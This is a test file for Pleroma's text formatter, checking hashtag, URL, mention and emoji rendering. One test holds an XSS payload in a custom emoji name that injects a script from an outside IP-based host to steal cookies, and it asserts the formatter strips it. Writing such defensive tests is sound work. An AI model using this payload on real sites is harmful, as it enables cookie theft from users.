defmodule Pleroma.FormatterTest do
  alias Pleroma.Formatter
  alias Pleroma.User
  use Pleroma.DataCase

  import Pleroma.Factory

  describe ".add_hashtag_links" do
    test "turns hashtags into links" do
      text = "I love #cofe and #2hu"

      expected_text =
        "I love <a href='http://localhost:4001/tag/cofe' rel='tag'>#cofe</a> and <a href='http://localhost:4001/tag/2hu' rel='tag'>#2hu</a>"

      tags = Formatter.parse_tags(text)

      assert expected_text ==
               Formatter.add_hashtag_links({[], text}, tags) |> Formatter.finalize()
    end
  end

  describe ".add_links" do
    test "turning urls into links" do
      text = "Hey, check out https://www.youtube.com/watch?v=8Zg1-TufF%20zY?x=1&y=2#blabla ."

      expected =
        "Hey, check out <a href=\"https://www.youtube.com/watch?v=8Zg1-TufF%20zY?x=1&y=2#blabla\">https://www.youtube.com/watch?v=8Zg1-TufF%20zY?x=1&y=2#blabla</a> ."

      assert Formatter.add_links({[], text}) |> Formatter.finalize() == expected

      text = "https://mastodon.social/@lambadalambda"

      expected =
        "<a href=\"https://mastodon.social/@lambadalambda\">https://mastodon.social/@lambadalambda</a>"

      assert Formatter.add_links({[], text}) |> Formatter.finalize() == expected

      text = "https://mastodon.social:4000/@lambadalambda"

      expected =
        "<a href=\"https://mastodon.social:4000/@lambadalambda\">https://mastodon.social:4000/@lambadalambda</a>"

      assert Formatter.add_links({[], text}) |> Formatter.finalize() == expected

      text = "@lambadalambda"
      expected = "@lambadalambda"

      assert Formatter.add_links({[], text}) |> Formatter.finalize() == expected

      text = "http://www.cs.vu.nl/~ast/intel/"
      expected = "<a href=\"http://www.cs.vu.nl/~ast/intel/\">http://www.cs.vu.nl/~ast/intel/</a>"

      assert Formatter.add_links({[], text}) |> Formatter.finalize() == expected

      text = "https://forum.zdoom.org/viewtopic.php?f=44&t=57087"

      expected =
        "<a href=\"https://forum.zdoom.org/viewtopic.php?f=44&t=57087\">https://forum.zdoom.org/viewtopic.php?f=44&t=57087</a>"

      assert Formatter.add_links({[], text}) |> Formatter.finalize() == expected

      text = "https://en.wikipedia.org/wiki/Sophia_(Gnosticism)#Mythos_of_the_soul"

      expected =
        "<a href=\"https://en.wikipedia.org/wiki/Sophia_(Gnosticism)#Mythos_of_the_soul\">https://en.wikipedia.org/wiki/Sophia_(Gnosticism)#Mythos_of_the_soul</a>"

      assert Formatter.add_links({[], text}) |> Formatter.finalize() == expected

      text = "https://www.google.co.jp/search?q=Nasim+Aghdam"

      expected =
        "<a href=\"https://www.google.co.jp/search?q=Nasim+Aghdam\">https://www.google.co.jp/search?q=Nasim+Aghdam</a>"

      assert Formatter.add_links({[], text}) |> Formatter.finalize() == expected

      text = "https://en.wikipedia.org/wiki/Duff's_device"

      expected =
        "<a href=\"https://en.wikipedia.org/wiki/Duff's_device\">https://en.wikipedia.org/wiki/Duff's_device</a>"

      assert Formatter.add_links({[], text}) |> Formatter.finalize() == expected

      text = "https://pleroma.com https://pleroma.com/sucks"

      expected =
        "<a href=\"https://pleroma.com\">https://pleroma.com</a> <a href=\"https://pleroma.com/sucks\">https://pleroma.com/sucks</a>"

      assert Formatter.add_links({[], text}) |> Formatter.finalize() == expected

      text = "xmpp:contact@hacktivis.me"

      expected = "<a href=\"xmpp:contact@hacktivis.me\">xmpp:contact@hacktivis.me</a>"

      assert Formatter.add_links({[], text}) |> Formatter.finalize() == expected

      text =
        "magnet:?xt=urn:btih:7ec9d298e91d6e4394d1379caf073c77ff3e3136&tr=udp%3A%2F%2Fopentor.org%3A2710&tr=udp%3A%2F%2Ftracker.blackunicorn.xyz%3A6969&tr=udp%3A%2F%2Ftracker.ccc.de%3A80&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=wss%3A%2F%2Ftracker.btorrent.xyz&tr=wss%3A%2F%2Ftracker.fastcast.nz&tr=wss%3A%2F%2Ftracker.openwebtorrent.com"

      expected = "<a href=\"#{text}\">#{text}</a>"

      assert Formatter.add_links({[], text}) |> Formatter.finalize() == expected
    end
  end

  describe "add_user_links" do
    test "gives a replacement for user links" do
      text = "@gsimg According to @archaeme, that is @daggsy. Also hello @archaeme@archae.me"
      gsimg = insert(:user, %{nickname: "gsimg"})

      archaeme =
        insert(:user, %{
          nickname: "archaeme",
          info: %Pleroma.User.Info{source_data: %{"url" => "https://archeme/@archaeme"}}
        })

      archaeme_remote = insert(:user, %{nickname: "archaeme@archae.me"})

      mentions = Pleroma.Formatter.parse_mentions(text)

      {subs, text} = Formatter.add_user_links({[], text}, mentions)

      assert length(subs) == 3
      Enum.each(subs, fn {uuid, _} -> assert String.contains?(text, uuid) end)

      expected_text =
        "<span><a class='mention' href='#{gsimg.ap_id}'>@<span>gsimg</span></a></span> According to <span><a class='mention' href='#{
          "https://archeme/@archaeme"
        }'>@<span>archaeme</span></a></span>, that is @daggsy. Also hello <span><a class='mention' href='#{
          archaeme_remote.ap_id
        }'>@<span>archaeme</span></a></span>"

      assert expected_text == Formatter.finalize({subs, text})
    end

    test "gives a replacement for user links when the user is using Osada" do
      mike = User.get_or_fetch("mike@osada.macgirvin.com")

      text = "@mike@osada.macgirvin.com test"

      mentions = Formatter.parse_mentions(text)

      {subs, text} = Formatter.add_user_links({[], text}, mentions)

      assert length(subs) == 1
      Enum.each(subs, fn {uuid, _} -> assert String.contains?(text, uuid) end)

      expected_text =
        "<span><a class='mention' href='#{mike.ap_id}'>@<span>mike</span></a></span> test"

      assert expected_text == Formatter.finalize({subs, text})
    end

    test "gives a replacement for single-character local nicknames" do
      text = "@o hi"
      o = insert(:user, %{nickname: "o"})

      mentions = Formatter.parse_mentions(text)

      {subs, text} = Formatter.add_user_links({[], text}, mentions)

      assert length(subs) == 1
      Enum.each(subs, fn {uuid, _} -> assert String.contains?(text, uuid) end)

      expected_text = "<span><a class='mention' href='#{o.ap_id}'>@<span>o</span></a></span> hi"
      assert expected_text == Formatter.finalize({subs, text})
    end

    test "does not give a replacement for single-character local nicknames who don't exist" do
      text = "@a hi"

      mentions = Formatter.parse_mentions(text)

      {subs, text} = Formatter.add_user_links({[], text}, mentions)

      assert length(subs) == 0
      Enum.each(subs, fn {uuid, _} -> assert String.contains?(text, uuid) end)

      expected_text = "@a hi"
      assert expected_text == Formatter.finalize({subs, text})
    end
  end

  describe ".parse_tags" do
    test "parses tags in the text" do
      text = "Here's a #Test. Maybe these are #working or not. What about #漢字? And #は｡"

      expected = [
        {"#Test", "test"},
        {"#working", "working"},
        {"#漢字", "漢字"},
        {"#は", "は"}
      ]

      assert Formatter.parse_tags(text) == expected
    end
  end

  test "it can parse mentions and return the relevant users" do
    text = "@gsimg According to @archaeme, that is @daggsy. Also hello @archaeme@archae.me"

    gsimg = insert(:user, %{nickname: "gsimg"})
    archaeme = insert(:user, %{nickname: "archaeme"})
    archaeme_remote = insert(:user, %{nickname: "archaeme@archae.me"})

    expected_result = [
      {"@gsimg", gsimg},
      {"@archaeme", archaeme},
      {"@archaeme@archae.me", archaeme_remote}
    ]

    assert Formatter.parse_mentions(text) == expected_result
  end

  test "it adds cool emoji" do
    text = "I love :moominmamma:"

    expected_result =
      "I love <img height=\"32px\" width=\"32px\" alt=\"moominmamma\" title=\"moominmamma\" src=\"/finmoji/128px/moominmamma-128.png\" />"

    assert Formatter.emojify(text) == expected_result
  end

  test "it does not add XSS emoji" do
    text =
      "I love :'onload=\"this.src='bacon'\" onerror='var a = document.createElement(\"script\");a.src=\"//51.15.235.162.xip.io/cookie.js\";document.body.appendChild(a):"

    custom_emoji = %{
      "'onload=\"this.src='bacon'\" onerror='var a = document.createElement(\"script\");a.src=\"//51.15.235.162.xip.io/cookie.js\";document.body.appendChild(a)" =>
        "https://placehold.it/1x1"
    }

    expected_result =
      "I love <img height=\"32px\" width=\"32px\" alt=\"\" title=\"\" src=\"https://placehold.it/1x1\" />"

    assert Formatter.emojify(text, custom_emoji) == expected_result
  end

  test "it returns the emoji used in the text" do
    text = "I love :moominmamma:"

    assert Formatter.get_emoji(text) == [{"moominmamma", "/finmoji/128px/moominmamma-128.png"}]
  end

  test "it returns a nice empty result when no emojis are present" do
    text = "I love moominamma"
    assert Formatter.get_emoji(text) == []
  end

  test "it doesn't die when text is absent" do
    text = nil
    assert Formatter.get_emoji(text) == []
  end
end
